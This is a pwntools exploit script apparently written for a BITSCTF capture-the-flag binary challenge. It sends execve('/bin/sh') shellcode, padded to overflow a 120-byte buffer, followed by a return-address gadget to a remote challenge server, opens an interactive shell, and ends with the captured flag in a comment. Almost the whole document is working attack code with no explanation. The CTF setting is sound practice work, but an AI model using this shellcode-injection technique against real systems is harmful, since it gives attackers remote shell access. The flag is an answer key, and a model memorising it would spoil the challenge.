from pwn import *
context.arch ='amd64'
elf = ELF("main")

r = elf.process()

#gdb.attach(r, """
#           break main
#           """)

POP_RBP_RET = 0x40111d
MOV_EDI_BSS_JMP_RAX = 0x04010a7

r = remote("chals.bitskrieg.in", 6001)


get_shell = """
                lea rdi,[rip+binsh]
                xor rsi,rsi
                xor rdx, rdx
                mov rax, 59
                syscall
                mov rax,60
                syscall
binsh:
                .string "/bin/sh"
               """

payload0 = asm(get_shell, arch='amd64')
shellcode_len = len(payload0)
payload = payload0 + b'a'*(120-shellcode_len)+p64(MOV_EDI_BSS_JMP_RAX)
r.sendline(payload)
r.interactive()
#BITSCTF{w3lc0m3_70_7h3_w0rld_0f_b1n4ry_3xpl01t4t10n_ec5d9205}